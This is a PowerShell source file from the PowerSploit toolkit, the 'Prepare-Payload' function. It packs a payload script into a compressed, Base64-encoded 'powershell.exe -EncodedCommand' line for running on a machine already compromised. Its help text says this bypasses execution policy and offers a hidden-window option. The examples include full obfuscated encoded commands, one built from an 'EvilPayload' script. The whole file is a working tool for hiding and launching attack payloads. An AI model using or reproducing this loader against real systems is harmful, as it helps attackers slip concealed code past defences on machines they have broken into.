function Prepare-Payload
{
<#
.SYNOPSIS

Compresses, Base-64 encodes, and generates command-line output for a PowerShell payload script.

PowerSploit Module - Prepare-Payload
Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
 
.DESCRIPTION

Prepare-Payload prepares a PowerShell script such that it can be pasted into a command prompt. The scenario for using this tool is the following: You compromise a machine, have a shell and want to execute a PowerShell script as a payload. This technique eliminates the need for an interactive PowerShell 'shell' and it bypasses any PowerShell execution policies.

.PARAMETER ScriptBlock

Specifies a scriptblock containing your payload.

.PARAMETER Path

Specifies the path to your payload.

.PARAMETER NoExit

Outputs the option to not exit after running startup commands.

.PARAMETER NoProfile

Outputs the option to not load the Windows PowerShell profile.

.PARAMETER NonInteractive

Outputs the option to not present an interactive prompt to the user.

.PARAMETER WindowStyle

Outputs the option to set the window style to Normal, Minimized, Maximized or Hidden.

.EXAMPLE

C:\PS> Prepare-Payload -Path C:\EvilPayload.ps1 -NonInteractive -NoProfile -WindowStyle Hidden

powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -EncodedCommand cwBhAGwAIABhACAATgBlAHcALQBPAGIAagBlAGMAdAA7AGkAZQB4ACgAYQAgAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgAKABhACAASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4ARABlAGYAbABhAHQAZQBTAHQAcgBlAGEAbQAoAFsASQBPAC4ATQBlAG0AbwByAHkAUwB0AHIAZQBhAG0AXQBbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcATABjAGkAeABDAHMASQB3AEUAQQBEAFEAWAAzAEUASQBWAEkAYwBtAEwAaQA1AEsAawBGAEsARQA2AGwAQgBCAFIAWABDADgAaABLAE8ATgBwAEwAawBRAEwANAAzACsAdgBRAGgAdQBqAHkAZABBADkAMQBqAHEAcwAzAG0AaQA1AFUAWABkADAAdgBUAG4ATQBUAEMAbQBnAEgAeAA0AFIAMAA4AEoAawAyAHgAaQA5AE0ANABDAE8AdwBvADcAQQBmAEwAdQBYAHMANQA0ADEATwBLAFcATQB2ADYAaQBoADkAawBOAHcATABpAHMAUgB1AGEANABWAGEAcQBVAEkAagArAFUATwBSAHUAVQBsAGkAWgBWAGcATwAyADQAbgB6AFYAMQB3ACsAWgA2AGUAbAB5ADYAWgBsADIAdAB2AGcAPQA9ACcAKQAsAFsASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAE0AbwBkAGUAXQA6ADoARABlAGMAbwBtAHAAcgBlAHMAcwApACkALABbAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkAKQAuAFIAZQBhAGQAVABvAEUAbgBkACgAKQA=

Description
-----------
Execute the above payload for the lulz. >D

.EXAMPLE

C:\PS> Prepare-Payload -ScriptBlock {Write-Host 'hello, world!'}

powershell.exe  -EncodedCommand cwBhAGwAIABhACAATgBlAHcALQBPAGIAagBlAGMAdAA7AGkAZQB4ACgAYQAgAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgAKABhACAASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4ARABlAGYAbABhAHQAZQBTAHQAcgBlAGEAbQAoAFsASQBPAC4ATQBlAG0AbwByAHkAUwB0AHIAZQBhAG0AXQBbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAQwB5AC8ASwBMAEUAbgBWADkAYwBnAHYATABsAEYAUQB6ADAAagBOAHkAYwBuAFgAVQBTAGoAUABMADgAcABKAFUAVgBRAEgAQQBBAD0APQAnACkALABbAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACwAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkA

.NOTES

This cmdlet was inspired by createcmd.ps1 script presented at Dave Kennedy and Josh Kelley's talk - "PowerShell...OMFG" (https://www.trustedsec.com/files/PowerShell_PoC.zip)

.LINK

http://www.exploit-monday.com
#>

    [CmdletBinding( DefaultParameterSetName = 'FilePath')] Param (
        [Parameter(Position = 1, ParameterSetName = 'ScriptBlock' )]
        [ValidateNotNullOrEmpty()]
        [ScriptBlock]
        $ScriptBlock,

        [Parameter(Position = 1, ParameterSetName = 'FilePath' )]
        [ValidateNotNullOrEmpty()]
        [String]
        $Path,

        [Switch]
        $NoExit,

        [Switch]
        $NoProfile,

        [Switch]
        $NonInteractive,

        [ValidateSet('Normal', 'Minimized', 'Maximized', 'Hidden')]
        [String]
        $WindowStyle
    )

    if ($PSBoundParameters['Path'])
    {
        $Text = Get-Content -Path $Path -Encoding Ascii -ErrorAction Stop
        $ScriptBytes = ([Text.Encoding]::ASCII).GetBytes($Text)
    }
    else
    {
        $ScriptBytes = ([Text.Encoding]::ASCII).GetBytes($ScriptBlock)
    }

    $CompressedStream = New-Object IO.MemoryStream
    $DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
    $DeflateStream.Write($ScriptBytes, 0, $ScriptBytes.Length)
    $DeflateStream.Dispose()
    $CompressedScriptBytes = $CompressedStream.ToArray()
    $CompressedStream.Dispose()
    $EncodedCompressedScript = [Convert]::ToBase64String($CompressedScriptBytes)

    # Generate the code that will decompress and execute the payload.
    # This code is intentionally ugly to save space.
    $NewScript = 'sal a New-Object;iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String(' + "'$EncodedCompressedScript'" + '),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()'

    # Base-64 strings passed to -EncodedCommand must be unicode encoded.
    $UnicodeEncoder = New-Object System.Text.UnicodeEncoding
    $EncodedPayloadScript = [Convert]::ToBase64String($UnicodeEncoder.GetBytes($NewScript))

    # Build the command line options
    $CommandlineOptions = New-Object String[](0)
    if ($PSBoundParameters['NoExit'])
    { $CommandlineOptions += '-NoExit' }
    if ($PSBoundParameters['NoProfile'])
    { $CommandlineOptions += '-NoProfile' }
    if ($PSBoundParameters['NonInteractive'])
    { $CommandlineOptions += '-NonInteractive' }
    if ($PSBoundParameters['WindowStyle'])
    { $CommandlineOptions += "-WindowStyle $($PSBoundParameters['WindowStyle'])" }

    $CommandLineOutput = "powershell.exe $($CommandlineOptions -join ' ') -EncodedCommand $EncodedPayloadScript"

    Write-Output $CommandLineOutput
}
